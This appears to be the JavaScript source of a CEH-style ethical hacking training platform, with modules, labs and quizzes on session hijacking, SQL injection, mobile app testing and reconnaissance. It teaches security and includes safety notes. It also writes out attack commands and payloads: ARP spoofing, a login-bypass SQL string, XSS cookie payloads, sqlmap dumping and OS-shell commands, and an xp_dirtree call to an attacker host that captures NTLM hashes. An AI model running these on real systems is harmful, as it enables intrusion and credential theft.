...
function doLogout(){ localStorage.removeItem('ceh_role');  localStorage.removeItem('ceh_token'); localStorage.removeItem('ceh_email'); location.reload(); }
...
function buildDiagramHTML(d){
  if(!d.diagram) return buildComingSoonHTML('\u{1F504}','Diagram & Workflow is being designed');
  
  let html = '';
  
  if(d.diagram.svg) {
    html += `<div style="background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:28px;margin-bottom:20px;">
  ...
  if(d.diagram.steps && d.diagram.steps.length) {
    html += `
    <div style="background:var(--panel);border:1px solid var(--border);border-radius:var(--radius);padding:28px;">
      <div style="font-size:1rem;font-weight:700;color:var(--blue);margin-bottom:24px;font-family:var(--mono);">${d.diagram.workflowTitle||'Process Flow'}</div>
  ...
  if(!html) return buildComingSoonHTML('\u{1F504}','Diagram & Workflow is being designed');
...
CONTENT['network-level-hijacking'] = {
  ...
  "commands": {
    "lin": [
      {
        "cmd": "arpspoof -i eth0 -t <victim_ip> <gateway_ip>",
        "purpose": "Perform ARP spoofing to intercept traffic.",
        "out": "ARP replies sent",
        "note": "Requires IP forwarding enabled",
        "mistake": "Causing a Denial of Service by not forwarding packets"
      }
    ],
    "win": [
      {
        "cmd": "arp -a",
        "purpose": "View the ARP cache to detect spoofing.",
        "out": "IP-to-MAC mappings",
        "note": "Look for duplicate MAC addresses",
        "mistake": "Ignoring dynamic entries"
      }
    ]
  },
  "lab": {
    ...
    "dependencies": [],
    "safety": [
      "Perform this lab only in an isolated environment. Do not use on production networks."
    ],
    "scenario": "Hijack an unencrypted Telnet session between two machines on the local network.",
    "objectives": [
      "Set up a Man-in-the-Middle (MitM) position.",
      "Monitor the Telnet connection.",
      "Inject commands into the active session."
    ],
    "steps": [
    ...
    "evidence": [
      "Screenshot of Ettercap capturing the connection.",
      "Screenshot of the injected command executing on the server."
    ],
    "validation": [
      "Verify the file `/tmp/hacked` was created on the server without logging in."
    ],
    "troubleshooting": [
      "If the connection drops, ensure IP forwarding is correctly enabled on the attacker machine."
    ],
    "mitre": [
      {
        "id": "T1557",
    ...
    "cleanup": [
      "Stop ARP poisoning in Ettercap and disable IP forwarding."
    ]
  },
  "quiz": [
    {
      ...
      "opts": [
        ...
        "Predicting or knowing the correct TCP sequence number",
        "Cracking the SSL/TLS encryption",
    ...
    },
    {
      ...
      "opts": [
        "It crashes the target server.",
        "It allows the attacker to intercept traffic between the client and server, placing them in a MitM position.",
        "It guesses the TCP sequence numbers automatically.",
    ...
    },
    {
      ...
      "opts": [
        "Both packets are processed normally.",
        "An ACK storm may occur as both sides send acknowledgments with desynchronized sequence numbers.",
    ...
    },
    {
      ...
      "opts": [
        "Intercepting UDP packets and replying to the client before the legitimate server does.",
        "Taking over a persistent UDP connection state.",
        "Decrypting UDP traffic.",
        "Spoofing the UDP sequence numbers."
      ],
      "correct": 0,
    ...
    },
    {
      ...
      "opts": [
        ...
        "It transmits data, including credentials and session traffic, in cleartext.",
    ...
    },
    {
      ...
      "opts": [
        "Sniffing requires physical access, hijacking does not.",
        "Sniffing is passive monitoring; hijacking is actively taking over the session.",
        "Sniffing only works on wireless networks.",
  ...
  "flashcards": [
    {
      "f": "TCP Sequence Number Prediction",
      "b": "Guessing the sequence numbers used in a TCP connection to inject forged packets."
    },
    {
      "f": "ARP Spoofing",
      "b": "Sending forged ARP messages to associate the attacker\'s MAC address with a legitimate IP address."
    },
    {
      "f": "Blind Hijacking",
      "b": "Injecting commands into a session where the attacker can send data but cannot see the response."
    },
    {
      "f": "ACK Storm",
      "b": "A flood of acknowledgment packets caused by desynchronized TCP sequence numbers during a hijack attempt."
    }
  ],
  "summary": [
...
CONTENT['session-hijacking-tools'] = {
  ...
  "commands": {
    "lin": [
      {
        "cmd": "arpwatch -i eth0",
        "purpose": "Monitor ARP activity and detect spoofing.",
        "out": "Alerts in syslog",
        "note": "Useful for detecting network hijacking prep",
        "mistake": "Ignoring alerts in dynamic DHCP environments"
      }
    ],
    "win": [
      {
        "cmd": "Get-NetIPsecMainModeSA",
        "purpose": "View active IPsec security associations.",
        "out": "Active IPsec connections",
        "note": "Verifies encryption is active",
        "mistake": "Assuming IPsec is enabled without checking"
      }
    ]
  },
  "lab": {
    ...
    "objectives": [
      "Configure Arpwatch to monitor the network.",
      "Simulate an ARP spoofing attack.",
      "Analyze the alerts generated by Arpwatch."
    ],
    "steps": [
    ...
    "evidence": [
      "Screenshot of the Arpwatch alerts in syslog.",
      "Screenshot of excessive ARP traffic in Wireshark."
    ],
    "validation": [
      "You should see clear alerts indicating that a MAC address for a specific IP has changed."
    ],
    "troubleshooting": [
      "If no alerts appear, ensure Arpwatch is listening on the correct interface."
    ],
    "mitre": [
      {
        "id": "T1040",
    ...
    "cleanup": [
      "Stop the ARP spoofing attack and stop the Arpwatch service."
    ]
  },
  "quiz": [
    {
    ...
    },
    {
      ...
      "opts": [
        ...
        "Port Security",
        "Enforcing HTTPS and secure cookie attributes",
        "Disabling ICMP"
      ],
      "correct": 2,
    ...
    },
    {
      ...
      "opts": [
        "By encrypting ARP packets",
        "By validating ARP packets against a trusted database (like DHCP snooping bindings) and dropping invalid ones",
        "By disabling the ARP protocol entirely",
        "By hiding MAC addresses"
      ],
      "correct": 1,
    ...
    },
    {
      ...
      "opts": [
        ...
        "To prevent client-side scripts from reading the cookie",
        "To control whether cookies are sent with cross-site requests, mitigating CSRF",
    ...
    },
    {
      ...
      "opts": [
        ...
        "Legitimate users' IP addresses may change during a session (e.g., switching from Wi-Fi to cellular data), causing accidental logouts.",
        "It is illegal in some jurisdictions.",
        "IP addresses cannot be read by web servers."
      ],
      "correct": 1,
    ...
    },
    {
      ...
      "opts": [
        ...
        "After successful authentication or privilege escalation",
    ...
    },
    {
      ...
      "opts": [
        "Passing session IDs in the URL (GET parameters)",
        "Storing session IDs in Local Storage instead of cookies",
        "Implementing absolute and idle session timeouts",
        "Using easily guessable sequential session IDs"
      ],
      "correct": 2,
  ...
  "flashcards": [
    {
      ...
      "b": "A network switch feature that prevents ARP spoofing by validating ARP packets."
    },
    {
      "f": "Arpwatch",
      "b": "A tool that monitors ARP traffic and alerts on changes in IP-to-MAC address pairings."
    },
    {
      "f": "Session Timeout",
      "b": "A countermeasure where sessions automatically expire after a period of inactivity."
    },
    {
      "f": "Session Regeneration",
      "b": "The practice of issuing a new session ID after a user successfully authenticates."
    }
  ],
  "summary": [
...
CONTENT['web-app-threats'] = {
  ...
  workflow: [
    ...
    'Step 3: Test for XSS by injecting harmless script tags (e.g., `<script>alert(1)\x3C/script>`) into input fields.',
  ...
  lab: {
    ...
    steps: [
      ...
      'Step 4: In the Message field, enter: `<script>alert(document.cookie)\x3C/script>`.',
...
CONTENT['sqli-concepts'] = {
    ...
    "lin": [
      {
        ...
        "purpose": "Automated SQLi and enumerate databases",
        "out": "List of databases",
        "note": "Use cautiously as it generates significant traffic",
        "mistake": "Scanning without explicit permission"
      }
    ],
    "win": [
      {
        "cmd": "Invoke-Sqlcmd -ServerInstance \"DBServer\" -Query \"SELECT * FROM Users\"",
        "purpose": "Run queries on MSSQL",
        "out": "Query results",
        "note": "Useful for DB administration and testing access",
        "mistake": "Running as SA account unnecessarily"
      }
    ]
  },
  "lab": {
    ...
    "objectives": [
      "Identify a SQLi vulnerability",
      "Extract the database version"
    ],
    "steps": [
      "Step 1: Navigate to the target login page.",
      "Step 2: Enter admin' OR 1=1-- into the username field."
    ],
    "evidence": [
      "Screenshot of bypassed login screen."
    ],
    "validation": [
      "You should see: Welcome, Admin"
    ],
    "troubleshooting": [
      "If login fails, ensure the comment syntax matches the backend database (e.g., -- or #)."
    ],
    "mitre": [
      {
        "id": "T1190",
    ...
    "cleanup": [
      "Log out of the application and stop the lab environment."
    ]
  },
  "quiz": [
    {
    ...
    },
    {
      ...
      "opts": [
        ...
        "A database firewall",
        "A technique that often inherently protects against SQLi",
  ...
  "flashcards": [
    {
      "f": "SQL Injection",
      "b": "An attack where malicious SQL statements are inserted into entry fields for execution."
    },
    {
      "f": "Tautology",
      "b": "A statement that is always true, often used in SQLi payloads like OR 1=1."
    }
  ],
  "summary": [
...
CONTENT['sqli-types'] = {
  ...
  "commands": {
    "lin": [
      {
        "cmd": "sqlmap -u \"http://target/page?id=1\" --technique=T",
        "purpose": "Test for Time-based Blind SQLi",
        "out": "Vulnerability confirmation",
        "note": "Time-based testing is slow",
        "mistake": "Setting high delays causing server timeouts"
      }
    ],
    "win": [
      {
        "cmd": "EXEC master..xp_dirtree '\\\\attacker.com\\share'",
        "purpose": "Out-of-Band SQLi (SMB Relay)",
        "out": "Captured NTLM Hash",
        "note": "Requires xp_dirtree enabled",
        "mistake": "Using invalid network paths"
      }
    ]
  },
  "lab": {
    ...
    "objectives": [
      "Identify a Time-based Blind SQLi",
      "Extract database user via Boolean-based SQLi"
    ],
    "steps": [
      "Step 1: Intercept the login request in Burp Suite.",
      "Step 2: Inject a WAITFOR DELAY payload and observe the response time."
    ],
    "evidence": [
      "Burp Suite history showing delayed responses."
    ],
    "validation": [
      "You should see: The response takes exactly 5 seconds longer than normal."
    ],
    "troubleshooting": [
      "If the response is not delayed, the database might not support WAITFOR DELAY (try pg_sleep for PostgreSQL)."
    ],
    "mitre": [
      {
        "id": "T1190",
    ...
    "cleanup": [
      "Close Burp Suite and stop the target application."
    ]
  },
  "quiz": [
    {
    ...
    },
    {
      ...
      "opts": [
        "Table names",
        "Database version",
        "Number and data types of columns",
        "Execution time"
      ],
      "correct": 2,
    ...
    },
    {
      ...
      "opts": [
        ...
        "Using Out-of-Band DNS requests"
      ],
      "correct": 1,
    ...
    },
    {
      ...
      "opts": [
        "In-Band requires network access; Inferential does not.",
        "In-Band retrieves data via the same channel; Inferential infers data from application behavior.",
        "Inferential is faster than In-Band.",
        "In-Band only works on MSSQL; Inferential only works on MySQL."
      ],
      "correct": 1,
    ...
    },
    {
      ...
      "opts": [
        ...
        "It relies on the database having outbound network access.",
        "It only works on older databases."
      ],
      "correct": 2,
  ...
  "flashcards": [
    {
      "f": "Inferential SQLi",
      "b": "A type of SQLi where the attacker infers data by observing application behavior, not direct data output."
    },
    {
      "f": "Out-of-Band SQLi",
      "b": "A type of SQLi that uses a different communication channel (like DNS or HTTP) to extract data."
    }
  ],
  "summary": [
...
CONTENT['sqli-methodology'] = {
  ...
  "commands": {
    "lin": [
      {
        "cmd": "sqlmap -u \"http://target/\" --crawl=2 --batch",
        "purpose": "Automated mapping and vulnerability detection",
        "out": "List of vulnerable parameters",
        "note": "Automated crawling can miss complex workflows",
        "mistake": "Running against production without tuning requests"
      }
    ],
    "win": [
      {
        "cmd": "sqsh -S Server -U user -P pass",
        "purpose": "Connect to MSSQL database for post-exploitation",
        "out": "Interactive SQL shell",
        "note": "Used after credentials are extracted",
        "mistake": "Failing to use encryption for connections"
      }
    ]
  },
  "lab": {
    ...
    "objectives": [
      "Map application inputs",
      "Fingerprint the backend database manually"
    ],
    "steps": [
      "Step 1: Spider the application using Burp Suite.",
      "Step 2: Inject database-specific functions like @@version or version()."
    ],
    "evidence": [
      "Extracted database version string."
    ],
    "validation": [
      "You should see: Microsoft SQL Server 2019"
    ],
    "troubleshooting": [
      "If generic errors appear, try Inferential techniques to deduce the database type."
    ],
    "mitre": [
      {
        "id": "T1190",
    ...
    "cleanup": [
      "Clear browser history and Burp Suite state."
    ]
  },
  "quiz": [
    {
    ...
    },
    {
      ...
      "opts": [
        "To guess passwords",
        "To identify the backend DBMS and version",
    ...
    },
    {
      ...
      "opts": [
        ...
        "Developers often assume they cannot be modified by users.",
        "They are encrypted.",
        "They speed up the application."
      ],
      "correct": 1,
  ...
  "flashcards": [
    {
      "f": "Database Fingerprinting",
      "b": "The process of determining the type and version of the backend database management system."
    },
    {
      "f": "Post-Exploitation (SQLi)",
      "b": "Actions taken after successful injection, such as reading files, escalating privileges, or gaining a command shell."
    }
  ],
  "summary": [
...
CONTENT['sqli-tools'] = {
  ...
  "commands": {
    "lin": [
      {
        "cmd": "sqlmap -r request.txt --dbs",
        "purpose": "Run SQLmap using a saved Burp request",
        "out": "List of databases",
        "note": "Best method for authenticated testing",
        "mistake": "Running without --batch in scripts"
      },
      {
        "cmd": "sqlmap -u \"http://target/page?id=1\" --dump -T users",
        "purpose": "Dump specific table contents",
        "out": "Contents of the users table",
        "note": "Can take a long time on large tables",
        "mistake": "Dumping entire databases unnecessarily"
      }
    ],
    "win": [
      {
        "cmd": "sqlmap.py -u \"http://target/page?id=1\" --os-shell",
        "purpose": "Attempt to gain an interactive OS shell",
        "out": "Command prompt access",
        "note": "Requires high privileges on the DB",
        "mistake": "Leaving the uploaded web shell on the server"
      }
    ]
  },
  "lab": {
    ...
    "objectives": [
      ...
      "Exploit the request with SQLmap",
      "Dump the users table"
    ],
    "steps": [
      "Step 1: Save the vulnerable POST request from Burp to req.txt.",
      "Step 2: Run sqlmap -r req.txt --dbs",
      "Step 3: Run sqlmap -r req.txt -D gfs_db -T users --dump"
    ],
    "evidence": [
      "Output of the dumped users table."
    ],
    "validation": [
      "You should see: Passwords or password hashes for application users."
    ],
    "troubleshooting": [
      "If SQLmap fails to detect the vulnerability, adjust the --level and --risk parameters."
    ],
    "mitre": [
      {
        "id": "T1190",
    ...
    "cleanup": [
      "Remove any files created by SQLmap testing."
    ]
  },
  "quiz": [
    {
    ...
    },
    {
      ...
      "opts": [
        ...
        "Loads an HTTP request from a text file",
    ...
    },
    {
      ...
      "opts": [
        ...
        "Drop an interactive command prompt on the database server",
        "Download the /etc/shadow file",
        "Bypass the OS firewall"
      ],
      "correct": 1,
    ...
    },
    {
      ...
      "opts": [
        "Burp Suite is faster than SQLmap.",
        "Burp Suite handles complex authentication and session management better.",
        "SQLmap cannot run on Windows.",
        "Burp Suite is required to start SQLmap."
      ],
      "correct": 1,
    ...
    },
    {
      ...
      "opts": [
        "--space-bypass",
        "--tamper scripts (e.g., space2comment)",
        "--level 5",
        "--force-ssl"
      ],
      "correct": 1,
  ...
  "flashcards": [
    {
      "f": "SQLmap",
      "b": "An open-source penetration testing tool that automates detecting and exploiting SQLi flaws."
    },
    {
      "f": "Interception Proxy",
      "b": "A tool like Burp Suite that sits between the client and server to inspect and modify traffic."
    }
  ],
  "summary": [
...
CONTENT['mobile-concepts'] = {
        ...
        "lin": [
            {
                ...
                "purpose": "Check connected USB devices",
                "out": "USB connection logs",
                "note": "Useful when attaching a mobile device",
                "mistake": "Ignoring permission errors"
            }
        ],
        "win": [
            {
                "cmd": "Get-PnpDevice -Class USB",
                "purpose": "List connected USB devices",
                "out": "List of USB devices including phones",
                "note": "Verify device recognition",
                "mistake": "Missing driver installation"
            }
        ]
    },
    "lab": {
        ...
        "objectives": [
            "Understand mobile device enumeration."
        ],
        "steps": [
            "Step 1: Connect the mobile device or start the emulator.",
            "Step 2: Use ADB to list the device."
        ],
        "evidence": [
            "Output of connected devices."
        ],
        "validation": [
            "You should see the device listed with a specific ID."
        ],
        "troubleshooting": [
            "If no devices are found, ensure USB debugging is enabled."
        ],
        "mitre": [
            {
                "id": "T1634",
    ...
    "quiz": [
        ...
        },
        {
            ...
            "opts": [
                "To verify the author and ensure code integrity",
                "To encrypt the application data",
                "To optimize code performance",
                "To compress the application size"
            ],
            "correct": 0,
        ...
        },
        {
            ...
            "opts": [
                "Mobile Device Management to secure and monitor devices",
                "Mobile Data Mining",
                "Master Data Management",
                "Mobile Display Mirroring"
            ],
            "correct": 0,
        ...
        },
        {
            ...
            "opts": [
                "Malicious apps bypassing official review processes",
        ...
        },
        {
            ...
            "opts": [
                "Managing radio functions and cellular communication",
                "Rendering graphics",
                "Handling application execution",
                "Storing user data"
            ],
            "correct": 0,
    ...
    "flashcards": [
        {
            "f": "Sandboxing",
            "b": "A security mechanism that isolates running programs to prevent them from interacting with each other."
        },
        {
            "f": "MDM",
            "b": "Mobile Device Management, software used by IT to control, secure, and enforce policies on smartphones and tablets."
        }
    ],
    "summary": [
...
CONTENT['android-hacking'] = {
        ...
        "lin": [
            {
                ...
                "purpose": "Install an APK on a device",
                "out": "Success message",
                "note": "Requires USB debugging",
                "mistake": "INSTALL_FAILED_ALREADY_EXISTS"
            },
            {
                "cmd": "apktool d app.apk",
                "purpose": "Decompile an APK",
                "out": "Decompiled folder",
                "note": "Reverses resources and smali code",
                "mistake": "Missing Java runtime"
            }
        ],
        "win": [
            {
                ...
                "out": "List of package names",
                "note": "Find target package name",
                "mistake": "Device not attached"
            }
        ]
    },
    "lab": {
        ...
        "dependencies": [],
        "safety": [
            "Perform this lab only in an isolated environment on provided vulnerable apps."
        ],
        "scenario": "GFS has acquired a new mobile banking app and requires a security assessment before launch.",
        "objectives": [
            "Decompile the APK and find hardcoded credentials."
        ],
        "steps": [
            "Step 1: Run `apktool d target.apk`.",
            "Step 2: Search for API keys in the `res/values/strings.xml` file.",
            "Step 3: Open the APK in Jadx to review the Java source code."
        ],
        "evidence": [
            "Screenshot of the hardcoded credentials found."
        ],
        "validation": [
            "You should find the secret key `GFS_SECRET_API_2026`."
        ],
        "troubleshooting": [
            "If Apktool fails, ensure it is updated to the latest version."
        ],
        "mitre": [
            {
                "id": "T1636",
        ...
        "cleanup": [
            "Remove the decompiled files and uninstall the app."
        ]
    },
    "quiz": [
        {
        ...
        },
        {
            ...
            "opts": [
                "Activity or Broadcast Receiver",
                "SharedPreferences",
                "SQLite Database",
                "Keystore"
            ],
        ...
        },
        {
            ...
            "opts": [
                ...
                "Advanced Device Bootloader",
                "Android Deployment Binary"
            ],
            "correct": 0,
    ...
    "flashcards": [
        {
            "f": "APK",
            "b": "Android Package Kit, the file format used by Android for distribution and installation of mobile apps."
        },
        {
            "f": "Smali",
            "b": "An assembler/disassembler for the dex format used by Dalvik/ART."
        }
    ],
    "summary": [
...
CONTENT['ios-hacking'] = {
    ...
    "commands": {
        "lin": [
            {
                "cmd": "ssh root@<ios-ip>",
                "purpose": "Connect to a jailbroken device",
                "out": "Root shell",
                "note": "Default password is usually \"alpine\"",
                "mistake": "Not changing the default password"
            }
        ],
        "win": [
            {
                ...
                "out": "Ping replies",
                "note": "Ensure device is on the same network",
                "mistake": "Firewall blocking connections"
            }
        ]
    },
    "lab": {
        ...
        "dependencies": [],
        "safety": [
            "Jailbreaking can void warranties and cause instability. Use only on dedicated lab devices."
        ],
        "scenario": "GFS requires an assessment of an internally developed iOS application for sensitive data leaks.",
        "objectives": [
            "Bypass jailbreak detection and analyze app data storage."
        ],
        "steps": [
            "Step 1: SSH into the jailbroken device.",
            "Step 2: Use Frida or Objection to hook the application.",
            "Step 3: Search for SQLite databases containing sensitive data."
        ],
        "evidence": [
            "Extracted sensitive data from the local database."
        ],
        "validation": [
            "You should locate unencrypted PII in the app\'s sandbox directory."
        ],
        "troubleshooting": [
            "If SSH fails, ensure the OpenSSH package is installed via the package manager."
        ],
        "mitre": [
            {
                "id": "T1636",
        ...
        "cleanup": [
            "Reboot the device (if tethered jailbreak) or remove the app."
        ]
    },
    "quiz": [
        {
            ...
            "opts": [
                "To ensure that only trusted, Apple-signed software loads at startup",
                "To encrypt user data on the device",
                "To prevent battery drain during startup",
                "To isolate applications in sandboxes"
            ],
            "correct": 0,
        ...
        },
        {
            ...
            "opts": [
                "Address Space Layout Randomization, which randomizes memory locations to prevent buffer overflow attacks",
                "Apple Secure Login Routine, for biometric auth",
                "Application Security Layer Restrictions, the sandbox implementation",
                "Advanced System Logging Resource, for auditing"
            ],
            "correct": 0,
    ...
    "flashcards": [
        {
            "f": "Jailbreaking",
            "b": "The process of removing software restrictions imposed by Apple on iOS devices."
        },
        {
            "f": "Secure Enclave",
            "b": "A hardware-based security feature that isolates cryptographic functions and biometric data."
        }
    ],
    "summary": [
...
CONTENT['mobile-security-tools'] = {
    ...
    "commands": {
        "lin": [
            {
                "cmd": "docker run -it -p 8000:8000 opensecurity/mobsf",
                "purpose": "Start MobSF using Docker",
                "out": "MobSF listening on port 8000",
                "note": "Requires Docker installed",
                "mistake": "Port 8000 already in use"
            }
        ],
        "win": [
            {
                "cmd": "objection -g com.target.app explore",
                "purpose": "Launch Objection",
                "out": "Objection CLI",
                "note": "Requires device connected via ADB and Frida running",
                "mistake": "Frida server not running on device"
            }
        ]
    },
    "lab": {
        ...
        "safety": [
            "Analyze only applications you have permission to test."
        ],
        "scenario": "GFS needs a rapid security check on a third-party vendor application.",
        "objectives": [
            "Run an automated static analysis using MobSF."
        ],
        "steps": [
            "Step 1: Start the MobSF Docker container.",
            "Step 2: Access the web interface at `localhost:8000`.",
            "Step 3: Upload the target APK and wait for the analysis to complete."
        ],
        "evidence": [
            "PDF report generated by MobSF."
        ],
        "validation": [
            "Identify at least two high-severity findings in the report."
        ],
        "troubleshooting": [
            "If MobSF fails to start, verify Docker service is running."
        ],
        "mitre": [
            {
                "id": "T1437",
    ...
    "quiz": [
        {
            ...
            "opts": [
                "Automated static and dynamic analysis of mobile applications",
                "Managing mobile devices in an enterprise",
                "Providing physical security for mobile hardware",
        ...
        },
        {
            ...
            "opts": [
                "To decrypt HTTPS traffic for inspection",
                "To speed up network requests",
                "To compress data payloads",
        ...
        },
        {
            ...
            "opts": [
                ...
                "It provides a graphical interface for Android",
                "It automatically roots the connected device"
            ],
            "correct": 0,
        ...
        },
        {
            ...
            "opts": [
                "Intercepting a function call to monitor or alter its behavior",
        ...
        },
        {
            ...
            "opts": [
                "Analyzing the application\'s code or binary without running it",
                "Running the application to observe its behavior",
                "Intercepting network traffic",
                "Fuzzing the application inputs"
            ],
            "correct": 0,
    ...
    "flashcards": [
        {
            "f": "SSL Pinning",
            "b": "A technique where an application is hardcoded to only trust specific SSL certificates, preventing MITM proxies."
        },
        {
            "f": "Objection",
            "b": "A runtime mobile exploration toolkit powered by Frida, built to help assess the security posture of mobile apps."
        }
    ],
    "summary": [
...
const SCRIPT = [
  ...
  { c: "var(--cyber-cyan)", t: "$ bloodhound-python -d corp.gfs.internal -c All" },
  { c: "#fff", t: "INFO: Found 312 users, 47 groups, 18 computers" },
  { c: "var(--cyber-cyan)", t: "$ impacket-GetUserSPNs corp.gfs.internal/operator" },
];
const ALERTS = [
...
function popoutWorkspace() {
  WorkspaceState.popout = true;
  const drawer = document.getElementById('term-drawer');
  if (drawer) drawer.classList.remove('open');
  window.open(window.location.pathname + '?mode=popout', '_blank', 'width=1024,height=768');
}

document.addEventListener('DOMContentLoaded', () => {
  const isPopout = window.location.search.includes('mode=popout');
  if (isPopout) {
    document.documentElement.style.setProperty('--sidebar-w', '0px');
    document.documentElement.style.setProperty('--topbar-h', '0px');
    
    const hideSelectors = ['.sidebar', '.topbar', '.content-wrapper', '.term-toggle-btn'];
    ...
    if (drawer) {
      ...
      drawer.style.top = '0';
      drawer.style.left = '0';
      drawer.classList.add('open', 'investigation');
    }
  ...
  if (window.BroadcastChannel) {
    window.cyberosSyncChannel = new BroadcastChannel('cyberos_workspace_sync');
    
    window.cyberosSyncChannel.onmessage = (e) => {
      const data = e.data;
      if (data.type === 'commandExecuted') {
        if (typeof window.originalAppendTerminal === 'function') {
           window.originalAppendTerminal(data.terminal, data.command, data.output);
        }
      } else if (data.type === 'stateUpdate') {
        if (data.mode && typeof window.originalSetWorkspaceMode === 'function') {
           window.originalSetWorkspaceMode(data.mode);
        }
        if (data.activeTerminal && typeof window.originalSetTermView === 'function') {
           window.originalSetTermView(data.activeTerminal);
        }
      } else if (data.type === 'requestState' && !isPopout) {
        window.cyberosSyncChannel.postMessage({
          type: 'fullState',
          winHtml: document.getElementById('term-body-win').innerHTML,
          linHtml: document.getElementById('term-body-lin').innerHTML
        });
      } else if (data.type === 'fullState' && isPopout) {
        document.getElementById('term-body-win').innerHTML = data.winHtml;
        document.getElementById('term-body-lin').innerHTML = data.linHtml;
        document.getElementById('term-body-win').scrollTop = document.getElementById('term-body-win').scrollHeight;
        document.getElementById('term-body-lin').scrollTop = document.getElementById('term-body-lin').scrollHeight;
      }
    };

    if (isPopout) {
      setTimeout(() => {
        window.cyberosSyncChannel.postMessage({ type: 'requestState' });
      }, 500);
    }
    
    // Hook UI State Functions
    if (typeof setWorkspaceMode === 'function' && !window.originalSetWorkspaceMode) {
      window.originalSetWorkspaceMode = setWorkspaceMode;
      window.setWorkspaceMode = function(mode) {
        window.originalSetWorkspaceMode(mode);
        window.cyberosSyncChannel.postMessage({ type: 'stateUpdate', mode: mode });
      };
    }
    
    if (typeof setTermView === 'function' && !window.originalSetTermView) {
      window.originalSetTermView = setTermView;
      window.setTermView = function(view) {
        window.originalSetTermView(view);
        window.cyberosSyncChannel.postMessage({ type: 'stateUpdate', activeTerminal: view });
      };
    }
    
    // Hook Execution Engine
    if (typeof appendTerminal === 'function' && !window.originalAppendTerminal) {
      window.originalAppendTerminal = appendTerminal;
      window.appendTerminal = function(os, cmd, output) {
        window.originalAppendTerminal(os, cmd, output);
        window.cyberosSyncChannel.postMessage({
...
function setWorkspaceMode(mode) {
  ...
  const drawer = document.getElementById('term-drawer');
  if (drawer) {
    drawer.classList.remove('practice', 'investigation');
    if (mode === 'practice') drawer.classList.add('practice');
    if (mode === 'investigation') drawer.classList.add('investigation');
  }
}

function setTermView(view) {
  WorkspaceState.activeTerminal = view;
  document.getElementById('tab-split').classList.remove('active');
  document.getElementById('tab-win').classList.remove('active');
  document.getElementById('tab-lin').classList.remove('active');
  document.getElementById('tab-' + view).classList.add('active');
  
  const container = document.getElementById('workspace-term-container');
  container.classList.remove('hide-win', 'hide-lin');
  if (view === 'win') container.classList.add('hide-lin');
  if (view === 'lin') container.classList.add('hide-win');
}
...
document.addEventListener('mousemove', (e) => {
  ...
  let pct = (newWidth / window.innerWidth) * 100;
  if (pct >= 28 && pct <= 60) {
    document.documentElement.style.setProperty('--workspace-w', pct + '%');
  }
});
...
document.addEventListener('keydown', (e) => {
  ...
  const drawer = document.getElementById('term-drawer');
  if (e.key === 'F11' && drawer && drawer.classList.contains('open')) {
    e.preventDefault();
    setWorkspaceMode(WorkspaceState.mode === 'investigation' ? 'learn' : 'investigation');
  }
  if (e.key === 'Escape' && drawer && drawer.classList.contains('open') && WorkspaceState.mode === 'investigation') {
...
CONTENT['footprinting-concepts'] = {
  ...
  "diagram": {
    ...
    "svg": "<svg width=\"100%\" height=\"200\" viewBox=\"0 0 600 200\" style=\"background:#0a0a0f;border:1px solid #1a1a24;border-radius:8px;\"><path d=\"M 100 100 L 250 100\" stroke=\"#00aaff\" stroke-width=\"2\" marker-end=\"url(#arrow)\"/><rect x=\"20\" y=\"70\" width=\"80\" height=\"60\" fill=\"#1a1a24\" stroke=\"#00aaff\"/><text x=\"60\" y=\"105\" fill=\"#fff\" font-family=\"monospace\" font-size=\"12\" text-anchor=\"middle\">Analyst</text><rect x=\"250\" y=\"70\" width=\"120\" height=\"60\" fill=\"#1a1a24\" stroke=\"#00aaff\"/><text x=\"310\" y=\"105\" fill=\"#fff\" font-family=\"monospace\" font-size=\"12\" text-anchor=\"middle\">OSINT Sources</text></svg>",
    "steps": [
      {
        "icon": "\ud83d\udd75\ufe0f",
  ...
  "commands": [
    {
      "win": "nslookup target.com",
      "lin": "dig target.com",
      "desc": "DNS Resolution",
      "out": "IP addresses of target.com",
      "note": "Enterprise Use: SOC Analysts use this to verify domain routing."
    },
    {
      "win": "ping target.com",
      "lin": "ping -c 4 target.com",
      "desc": "Host Discovery",
      "out": "ICMP Echo Replies",
      "note": "Enterprise Use: Network Engineers use this to verify host liveness."
    }
  ],
  "lab": {
...
CONTENT['osint-techniques'] = {
  ...
  "diagram": {
    "title": "Architecture & Flow",
    "svg": "<svg width=\"100%\" height=\"200\" viewBox=\"0 0 600 200\" style=\"background:#0a0a0f;border:1px solid #1a1a24;border-radius:8px;\"><text x=\"300\" y=\"100\" fill=\"#00aaff\" font-family=\"monospace\" font-size=\"14\" text-anchor=\"middle\">Analyst -> OSINT Framework -> Aggregated Data</text></svg>",
    "steps": [
      {
        "icon": "\ud83c\udfaf",
  ...
  "commands": [
    {
      "win": "theharvester -d target.com -b google",
      "lin": "theHarvester -d target.com -b google",
      "desc": "Email Harvesting",
      "out": "List of discovered email addresses",
      "note": "Enterprise Use: Pen Testers use this to build target lists for phishing."
    },
    {
      "win": "curl -s https://crt.sh/?q=target.com",
      "lin": "curl -s \"https://crt.sh/?q=target.com&output=json\"",
      "desc": "Certificate Search",
      "out": "List of subdomains from certs",
      "note": "Enterprise Use: Bug Bounty hunters use this to find hidden infrastructure."
    }
  ],
  "lab": {
...
CONTENT['whois-dns'] = {
  ...
  "diagram": {
    "title": "Architecture & Flow",
    "svg": "<svg width=\"100%\" height=\"200\" viewBox=\"0 0 600 200\" style=\"background:#0a0a0f;border:1px solid #1a1a24;border-radius:8px;\"><text x=\"300\" y=\"100\" fill=\"#00aaff\" font-family=\"monospace\" font-size=\"14\" text-anchor=\"middle\">User -> DNS Query -> Resolver -> Authoritative DNS -> Response</text></svg>",
    "steps": [
      {
        "icon": "\ud83d\udcdd",
        "label": "Query WHOIS",
  ...
  "commands": [
    {
      "win": "nslookup -type=mx target.com",
      "lin": "host -t mx target.com",
      "desc": "Find Mail Servers",
      "out": "List of MX records",
      "note": "Enterprise Use: Used to identify email infrastructure for social engineering."
    },
    {
      "win": "nslookup -type=any -ls target.com",
      "lin": "dig axfr @ns1.target.com target.com",
      "desc": "Zone Transfer",
      "out": "Full DNS zone dump if vulnerable",
      "note": "Enterprise Use: Red Teams use this to instantly map an entire network."
    }
  ],
  "lab": {
...
CONTENT['google-hacking'] = {
  ...
  "diagram": {
    "title": "Architecture & Flow",
